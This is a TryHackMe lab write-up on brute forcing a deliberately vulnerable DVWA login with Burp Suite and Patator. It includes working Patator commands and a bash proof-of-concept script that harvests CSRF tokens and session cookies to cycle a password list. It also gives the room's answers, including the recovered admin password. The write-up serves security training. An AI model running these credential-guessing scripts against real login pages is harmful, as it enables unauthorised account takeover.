<h1 align="center">Brute Force Heroes</h1>
<h3 align="center">Practice $$\textcolor{#3bd62d}{\textnormal{Burp Suite  .  Patator}}$$.</h3>
<p align="center">August 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>452</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
Walkthrough room to look at the different tools that can be used when brute forcing, as well as the different situations that might favour one tool over another.<br>
Click <a href="https://tryhackme.com/room/bruteforceheroes">here </a>to access this TryHackMe walkthrough.<br>
<img width="160px" src="https://github.com/user-attachments/assets/e404db20-0897-43ed-8baf-5e39a97a9c5f"><br>
<img width="1200px" src=""></p>




<br>

<h2>Task 1 . Launch The VM</h2>
<p>Start the VM attached to this task . This will launch a modified version of the DVWA at  MACHINE_IP . This is what we will be using to practice our brute forcing skills and tools against.<br>

It can take up to 5 minutes for the VM and associated service to launch, so give it a little room to breath. Go ahead and read the introduction below. Don't worry; we'll include a link in there for you too.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Start your engines! Sorry... VM!<br>
<code>No answer needed</code></p>

<br>

<h2>Task 2 . Introduction</h2>
<p>Welcome to Brute Force Hero's. We're going to look at brute force from a zero to hero approach. Covering what brute forcing is, the different tools we can use (despite what you might believe Hydra isn't the only option we have), and the when's and whys behind using these different tools.<br>

If you're already familiar with the concepts behind brute forcing please feel free to skip ahead and get right into it in the next task. The rest of us will take 5 minutes to look at what exactly brute forcing is.</p>

<h3>What is brute forcing?</h3>
<p>Simply put brute forcing is just guesswork - Though we try our best to make it educated:</p>

<p align="center"><img width="200px" src="https://github.com/user-attachments/assets/bce82b8a-79ec-4f41-a610-199e041c513e"></p>

<p>The difference between doing it in person and trying to login to a service or resource is that we have to try and make sure our guesses are not only correct but that we're also speaking the correct language and we've formatted our guess correctly.<br>

Imagine if in the above scenario the old schoolmate spoke a different language to us (it was a foreign exchange programme) - We could guess all day, but we might never know if we got it right, especially if our pronunciation is off or we build our sentences differently:<br>

    Is your name Dave?<br>
    Dave is your name?<br>
    You're Dave right?</p>

<p>If you look at popular tools like Hydra there are a whole load of supported formats:<br>

It supports the following formats: Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</p>

<p>This is normally where people have issues - Making sure that their brute force requests match the expected format and are going to be accepted and processed as expected by the receiving service or resource. <br>

Another issue we might face when trying to brute force a login is that it is not stealthy.<br>

Going back to our schoolmate comparison, after a couple of guesses, people nearby will start to notice that you're just saying random names at someone. The same thing is going to happen if you're taking random guesses at a user's login online.<br>

Anyone monitoring the traffic will notice a sudden increase in login attempts, with most of them being wrong. That's going to raise some red flags. Plus, if they have automated lockout or failed attempt protection enabled, it's going to make it difficult for you.</p>

<h3>GUI v CLI</h3>
<p>There are multiple tools which can be used for brute forcing - One of the most common is the ever-popular Hydra.<br>

But it isn't the only tool or necessarily the best choice, depending on the situation. During this lab, we will look at four tools that can be used for brute forcing. Two will GUI based (Burp Suite and OWASP ZAP) the other two will be CLI base (Hydra and Patator).<br>

There is no need to have prior experience using these tools as we will cover the relevant steps for each one during this room. But we have linked some other THM rooms which people might find useful. Go ahead and have a play!<br>

Patator is not as well known as Hydra - So if this is your first time using it, fear not! We will cover everything you need to know to bring you up to speed. If you are using a Kali or Parrot OS then chances are it is pre-installed. If it isn't, then you can install it using apt:

<code>sudo apt install patator</code><br>

Or visit the github page<br><br>

If you're using the attack box that comes with THM, and  sudo apt install patator, then to get patator working correctly, you will need to link it to a python2 runtime. One way to do that is to setup a virtual python environment. If you're unsure how to do that, follow these steps (which assume you're using the THM box and running as root):<br>

<code>apt install virtualenv</code><br>

<code>cd ~</code><br>

<code>virtualenv -p `which python2` venv</code><br>

<code>source venv/bin/activate</code><br><br>
You should then see that your shell prompt has <code>(venv</code> in front of it and that patator runs with no problems like this:</p>

<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/2330b353-3275-4d07-b7e9-59be8a87d252"></p>

<p>This will make sure that Patator is linked to the version of Python that it needs to run (as it will error otherwise). If you are using the attack box and clone the github repo then you won't need to make this change.<br>

Once you have Patator installed (as well as the other tools), go ahead and move on to the next task, where we'll get started using Burp Suite.</p>

<p><em>Answer the question below</em></p>

<p>2.1. Read the above and ensure you are ready to start<br>
<code>No answer needed</code></p>

<br>

<h2>Task 3 . Getting Started - Burp Suite</h2>
<p>First thing first, download the attached password file. This is a custom password file built specifically for this room. Make sure you save it somewhere readily accessible as it will be used a lot in this room.

Next fire up Burp Suite. We'll start off by using this to proxy our web traffic to and from the target (the modified DVWA instance at xx.xxx.xxx.xxx ) . Depending on your version of Burp Suite you can either use the inbuilt browser:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/6051d8b7-f691-4348-a58c-7f26641c3775"></p>

<p>Or set your browser to use Burp Suite as a proxy - Port Swigger (the people behind Burp Suite) have a great guide here, so if you're unsure, follow that. Whichever browser you're using your proxy settings will need to look something like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/224f1b33-e620-4aad-b3f2-7113b4999109"></p>

<p>Assuming you haven't made any changes to the Burp Suite defaults.<br>

Once Burp Suite is up and running, go ahead and access the DVWA instance by pointing your web browser at http://xx.xxx.xxx.xxx. You should be met with a login screen. I recommend turning off the intercept (it's under the Proxy->Intercept tab and can be seen in the first screenshot above). We don't really need it for this task, and it is going to get really annoying if you have to manually forward each and every request. Instead, we'll be able to do everything we want from the HTTP history tab. So your screen should look like this:</p>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/00a0b6da-e0a2-4bd6-956a-7f84a9c077c5"></p>

<p>Now try and login - We'll give you the username admin - The password we're going to try and work out ourselves.  For those of you who have played around with DVWA before, the default credentials have been changed. It's vulnerable, but not that vulnerable. Make a couple of login attempts and look at the traffic in your HTTP history tab on Burp Suite. It should look something like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b831b95e-142e-49ad-b793-e651a4a29b45"></p>

<p>Each login attempt made via a POST request is met with a 302 response code message before we're redirected back to the login page... You'll also notice that each response to our login attempt is essentially blank. But we can see a message on the login page itself which says Login Failed. That message is actually part of the next request, as we can see here:</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/0f25df59-c698-4718-a858-b8daeb752a19"><br></h6>


<p>This is important, and we'll come back to why in a little bit... But for now. It's Brute Force time!</p>

<p><em>Answer the question below</em></p>

<p>3.1. What does HTTP response code 302 mean? Hint: <em>Checkout the MDN webdocs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status</em><br>
<code>Found</code></p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/501b59e9-b014-4da2-a614-40ac9210e58c"><br><br>
                   <img width="800px" src="https://github.com/user-attachments/assets/c1ab8ce3-4d5e-4278-b5e8-d82085c9b3fe"><br><br>
                   <img width="800px" src="https://github.com/user-attachments/assets/55939ec7-b352-47bb-941d-218548b7ad65"></h6>


<br>

<h3>Task 4 . Brute Forcing - Burp Suite</h3>
<p>So now we have some real requests we can examine. We can use these to template our brute force requests. In our previous analogy, we've got the language, and how the sentence is formatted, we just need to keep swapping the names out. Right click a login attempt request from our HTTP history and then click <strong>Send to Intruder</strong>:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b5bc24ae-f4d8-48e7-9ea5-ed12971f6aa3"></p>

<p>You should then notice that the Intruder tab at the top is flashing. Click on the tab and then click <strong>Positions</strong> which will be along the top of the Intruder tab:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/dd553503-74b1-4d14-a31c-4d39b6550e71"></p>

<p>Next, within the Positions window, hit the <strong>Clear</strong> button - This will remove all the preset positions which Burp Suite will have pre-populated for us.  Burp Suite will automatically select any value on the right side of a '=' . For our case, the only value we want to set as a position that Burp Suite will replace in each attempt is the <strong>password</strong> value. Click the password value (in this instance, it is password, but depending on what you typed it could be different) and click <strong>Add</strong>. This will set the payload position, and we'll be ready to move on to the next stage.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/5fc8a2b3-c8c2-4afd-b27b-c4511f153715"></p>

<p>The <strong>Intruder->Payloads</strong> tab is where we add the payload to be used in the replacement. Burp Suite will take the payload we provide and use its values to replace our marked value. There are a few options here for loading payloads. We are going to load the password file provided in this room by clicking <strong>Load</strong> ... within the <strong>Payload Options [Simple List]</strong> section. Select the passwords.txt file you downloaded, and you should see the contents are loaded in, which should look like the below:</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/3c902cee-4ccc-4141-95b7-eaf43b20db00"></p>

<p>Now at this stage, we're ready to launch our attack. Click <strong>Strat attack</strong>; if (like me) you're using the Community Edition, then a popup will appear. The TL;DR is that because you're using the free version, your attack will be throttled. Click Ok, and then the attack dialogue box itself will appear. It will show the payload value used in each attempt, the response code, and the response length. These are our indicators that our login attempt(s) have or haven't been successful. If we notice a different response code or different response length we should investigate these responses further to confirm whether or not this was a successful attempt, or it was an error of some kind. An example error would be if you used a large password file with some special characters that the end service couldn't process correctly.<br>

Now. This is where I have a confession to make. The screenshot below shows me trying to brute force the login. The value I have covered over is the correct password. Notice anything strange about the successful password?</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/60f8d80e-b187-45bf-a46c-5b2b2582c7a6"></p>

<p><em>(N.B. For those of you about to try and just look through the password file to work out the correct value - I replaced the value at that location in the file with the correct password. I like your thinking, but it won't be that easy. Try it if you don't believe me. )</em></p>

The strange thing is that the response codes and response lengths are all the same, even for the successful password. You have no evidence from the attack dialogue box that this is the correct password, but it is, I promise, and I can even prove it (sort of).<br>

The image below shows what a successful login attempt really looks like. The initial response to the login is actually the same as we saw with our incorrect logins, a 302 redirect response. But the next request is different! It doesn't redirect us to login.php (check the earlier screenshots). Instead, we go to the index.php page. We can also see that in the response for a successful login, the Location Response Header is different. So we could look at the redirect destination to tell if our login attempt was successful or not. One problem, Intruder only shows us the initial response (the redirect itself), not the destination...</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/c7d6ec24-2899-414c-ad30-925f3df3b146"></p>

<p>Now those of you who are observant might have noticed that in our screenshot of the successful intruder attack, the response to the correct password attempt had a Response Header called Location, which was set to login.php. Well, one of the other issues with Burp Suite is that it will reuse the same original request. That might work in some instances, but not for all of them. If the server is expecting a unique user_token for each login attempt and it gets the same one reused multiple times, we might not be able to get in even with the correct password. Back to what we said at the start - The format for our request needs to be what the server expects. If it isn't, we're not going to get very far.<br>

But don't lose hope just yet! We know what won't work, and importantly, we know why (or we can make some pretty educated guesses as to why). All we need to do now is change tactics. Remember Try Harder is all well and good, but sometimes we need to couple that with Try Smarter.<br>

Also, if you've got this far and Burp Suite is still running your brute force attempt, I'd turn it off. For now, at least.<br>

N.B - It is possible to use things like Burp Suite Macros to help us get around the use of things like the unique user_token. However that is outside the scope of this room. I would recommend visiting Burp Suite Basics for more info.</p>

<p><em>Answer the questions below</em></p>

<p>4.1. What's an easy way for us to tell the difference between a failed and a successful login attempt in the above? Hint : <em>Which Response Header?</em><br>
<code>Location Response Header</code></p>

<br>

<p>4.2. Can we use Burp Suite to effectively brute force the login in this instance? (Yay/Nay)<br>
<code>Nay</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/8f42c566-b56f-4f28-8b08-d0d0f75c748d"><br><br>
                   <img width="300px" src="https://github.com/user-attachments/assets/a731f892-4edc-4e6f-a34c-c7d5b5c4ef46"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/55939ec7-b352-47bb-941d-218548b7ad65"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/b2c905c5-e0e3-46dd-9501-1417645a6ee6"></h6>


<br>
<h2>Task 5 . Brute forcing - Patator</h2>
<p>So we tried with Burp Suite - But it turns out this isn't the right tool for this job.<br>

But it was still a great starting point, we were able to work out the request syntax (how the login request is formed), and we can use that information going forward to try a different tool. <br>

Now, this is a brute forcing room - So surely we'll use Hydra now, right?<br>

Nope! (You clearly didn't read the task name, by the way). It's Patator to the rescue!</p>

<p align="center"><img width="150px" src="https://github.com/user-attachments/assets/b20124bf-0fe2-4bcc-bea9-d641c12a68fe"></p>

<p>I've chosen Patator for a couple of reasons - One is that it's not a widely used tool, despite (I think) being fantastic at what it does. The second is that Hydra isn't our best bet here either. You only have to do a quick search to find that people have had plenty of issues trying to brute force DVWA with Hydra (like this issue thread here). We could use a different version of Hydra, such as 8.1 on Ubuntu, but let's see if we can't find a different tool to do the job and hopefully add something new and useful to your CTF arsenal. So let's get started.<br>

So first thing first - Let's look at Patator a bit before we get started. If you run <code>patator -h</code>, you'll get the following output listing the available modules (remember to run the command we gave you in the Introduction section in order to allow Patator to run correctly on the AttackBox):</p>

<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/d3e7697c-b8dd-4003-918f-d947b2ec4351"></p>

<p>There are a lot of modules. We won't be playing with them all (today), but we can see one that is of immediate interest to us <code>http_fuzz</code>, so let's look at that. Type <code>patator http_fuzz -h</code> and look through the options for this module. Looking at the available options, we can break our command down into the required parts:</p>

```bash
patator http_fuzz method=<HTTP METHOD> \
url=<target url> \
body=<data> \
header=<headers> \
-x quit:<condition>
```

<p>Now here is where we look back at our Burp Suite requests (see, there was a reason I made us use Burp Suite first). </p>

<p align="center"><img width="900px" src="https://github.com/user-attachments/assets/b6a2ecba-05b2-4ab5-80e2-307344714566"></p>

<p>So using what we know we can construct the following command:</p>

```bash
patator http_fuzz method=POST \
url="http://10.201.107.100/login.php" \
body="username=admin&password=password&Login=Login&user_token=21e0ad6d56fa24f77647ef7dabd21be8" \
header="Cookie: PHPSESSID=lq805gkohiamc501riahr6jltk; security=impossible" \
-x quit:fgrep!=login.php
```

<p>The <code>url</code>,<codebody</code>, and <code>header</code> fields can be copied directly from the Burp Suite window. The quit condition is checking that the returned response does not 
contain the text login.php.

- We need to add in our payload so we can incrementally swap out the password each time with one from our list.<br>
- We don't want to be re-sending the same user_token and Cookie value.<br><br>
Thankfully, with a bit of bash magic, we can create a script to dynamically generate those values for us - And we don't even have to do all the heavy lifting ourselves, thanks to g0tm1lk . We can take the script they've made and adapt it for our own brute force attempts. Our script should now look like this:</p>


```bash
IP=10.201.107.100

CSRF=$(curl -s -c dvwa.cookie "${IP}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)

SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

echo "The CSRF is: $CSRF"

echo "The PHPSESSID is: $SESSIONID"

patator http_fuzz method=POST --threads=64 timeout=10 \
url="http://${IP}/login.php" \
0=passwords.txt \
body="username=admin&password=FILE0&Login=Login&user_token=${CSRF}" \
header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" \
-x quit:fgrep!=login.php
```

<p>N.B. If you find that when you run the above, you get errors about k,v pairs try changing the script so that the patator command is all on one line. Like this:</p>

```bash
patator http_fuzz method=POST --threads=64 timeout=10 url="http://${IP}/login.php" 0=passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=${CSRF} header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" -x quit:fgrep!=login.php
```

<p>When you run this script, you might notice something - When it stops, it's not easy to tell which password is actually the correct one. We can filter out all the wrong passwords using the -x ignore: action. The syntax and format are basically the same as the quit action. So all you need to do is test and adjust... I've even made the correct command the answer to Question 1. So if you get that right, you know you're good to go. If you get stuck, think about what text is in the response if the result was incorrect. We can ignore those responses and not print them to the screen.<br>

Add the -x ignore: action to the end of your existing patator command (right after the quit action), and the only result you'll get will be the admin password!</p>

<p><em>Answer the questions below</em></p>

<p>5.1. What action can we use to show only the correct password (the answer includes '  ')?<br>
<code>-x ignore:fgrep='Location: login.php'</code></p>

<br>

<p>5.2 .What is the admin password? <br>
<code>1qaz@WSX</code></p>

<br>


```bash
:~/BruteForceHeroes# apt install patator
```

```bash
:~/BruteForceHeroes# :~/BruteForceHeroes# patator -h
...
Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + ajp_fuzz      : Brute-force AJP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + rdp_login     : Brute-force RDP (NLA)
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward DNS lookup
  + dns_reverse   : Reverse DNS lookup
  + snmp_login    : Brute-force SNMP v1/2/3
  + ike_enum      : Enumerate IKE transforms
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3a10bbd8-8efa-44a8-978e-b4c26c62cc69"></p>

<p>

- Method: <code>POST</code><br>
- Cookie: <code>PHPSESSID=45eu1udsigp66r4dacbk2d14o7; security=impossible</code><br>
- Data: <code>username=admin&password=password&Login=Login&user_token=642ad57c2e23f5ad18648f8798c1fb41</code><br>
- Exit Condition: <ode>Location: login.php</code>

</p>


<h3>Patator</h3>

<p>Did not work</p>

<br>

<h3>gotm1lk</h3>
<p>https://blog.g0tmi1k.com/dvwa/login/</p>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/51c62612-58e6-45b9-abf4-1564e0dfe08c"></p>

<h4>PoC</h4>

<p>

- <code>passwords.txt</code> is the Task File downloaded<br>
- <code>user.txt</code> is a file containing <code>admin</code></p>


<p><em>PoC</em></p>

```bash
#!/bin/bash
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/login/

## Variables
URL="http://10.201.107.100/login.php"
USER_LIST="user.txt"
PASS_LIST="passwords.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

#    ## Feedback for user
#    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## Connect to server
    #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] We did it ..."
      echo        "[i] ---------- Username : ${_USER}"
      echo        "[i] ---------- Password : ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie
```

<p>admin : Username : 1qaz@WSX</p>

```bash
:~/BruteForceHeroes# ./PoC


[i] We did it ...
[i] ---------- Username : admin
[i] ---------- Password : 1qaz@WSX
```


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e4f34daf-e280-4141-b711-b53a0da0f8d2"></p>


<br>








